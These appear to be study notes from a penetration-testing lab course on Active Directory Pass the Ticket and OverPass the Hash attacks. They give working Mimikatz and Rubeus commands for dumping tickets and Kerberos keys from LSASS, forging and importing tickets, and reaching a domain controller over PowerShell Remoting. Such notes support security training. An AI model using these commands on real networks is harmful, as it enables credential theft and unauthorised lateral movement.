Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.

## Kerberos protocol refresher

The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

- The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.

When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash.

If the user wants to connect to an MSSQL database, it will request a `Ticket Granting Service` (`TGS`) to the `Key Distribution Center` (`KDC`), presenting its `Ticket Granting Ticket` (`TGT`). Then it will give the TGS to the MSSQL database server for authentication.

## Pass the Ticket (PtT) attack

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:

- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

**Before we perform a `Pass the Ticket (PtT)` attack, let's see some methods to get a ticket using `Mimikatz` and `Rubeus`.**


---

## Harvesting Kerberos tickets from Windows

*On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it.*

**As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.**

We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.

#### Mimikatz - Export tickets

	c:\tools> mimikatz.exe

	mimikatz # privilege::debug

	mimikatz # sekurlsa::tickets /export

	mimikatz # exit 
	Bye!

	c:\tools> dir *.kirbi

The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory.

**Note:** If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

We can also export tickets using `Rubeus` and the option `dump`. This option can be used to dump all tickets (if running as a local administrator). `Rubeus dump`, instead of giving us a file, will print the ticket encoded in Base64 format. We are adding the option `/nowrap` for easier copy-paste.

#### Rubeus - Export tickets

	c:\tools> Rubeus.exe dump /nowrap

`Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.`

## Pass the Key aka. OverPass the Hash

The traditional `Pass the Hash` (`PtH`) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`).

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`.

#### Mimikatz - Extract Kerberos keys

	c:\tools> mimikatz.exe

	mimikatz # privilege::debug

	mimikatz # sekurlsa::ekeys

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using `Mimikatz` and `Rubeus`.

#### Mimikatz - Pass the Key aka. OverPass the Hash

	c:\tools> mimikatz.exe

	mimikatz # privilege::debug

	mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`.

#### Rubeus - Pass the Key aka. OverPass the Hash

	c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

## Pass the Ticket (PtT)

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in Base64 format.

, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

#### Rubeus - Pass the Ticket

	c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

Note that now it displays `Ticket successfully imported!`.

Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

#### Rubeus - Pass the Ticket

	c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack.

We can use PowerShell to convert a .kirbi to Base64.

#### Convert .kirbi to Base64 Format

	PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

Using Rubeus, we can perform a Pass the Ticket providing the Base64 string instead of the file name.

#### Pass the Ticket - Base64 Format

	c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.

#### Mimikatz - Pass the Ticket

	C:\tools> mimikatz.exe

	mimikatz # privilege::debug

	mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

	c:\tools> dir \\DC01.inlanefreight.htb\c$

Mimikatz se agar tum **Kerberos ticket import** karte ho, to ticket jis Windows logon session mein import hua hai, us session mein available hota hai.

cmd.exe
   ↓
mimikatz.exe
   ↓
ticket import
   ↓
mimikatz exit
   ↓
same cmd.exe
   ↓
klist


---

## Pass The Ticket with PowerShell Remoting (Windows)

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

## Mimikatz - PowerShell Remoting with Pass the Ticket

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine.

open a new `cmd.exe` and execute `mimikatz.exe`, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our `cmd.exe` session, we can launch a PowerShell command prompt from the same `cmd.exe` and use the command `Enter-PSSession` to connect to the target machine.

#### Mimikatz - Pass the Ticket for lateral movement.

	C:\tools> mimikatz.exe

	mimikatz # privilege::debug

	mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

	mimikatz # exit

	c:\tools>powershell

	PS C:\tools> Enter-PSSession -ComputerName DC01 
	[DC01]: PS C:\Users\john\Documents> whoami inlanefreight\john 
	[DC01]: PS C:\Users\john\Documents> hostname DC01 
	[DC01]: PS C:\Users\john\Documents>

## Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)).

#### Create a sacrificial process with Rubeus

	C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

#### Rubeus - Pass the Ticket for lateral movement

	C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

	c:\tools>powershell

	PS C:\tools> Enter-PSSession -ComputerName DC01
	[DC01]: PS C:\Users\john\Documents> whoami
	inlanefreight\john
	[DC01]: PS C:\Users\john\Documents> hostname DC01



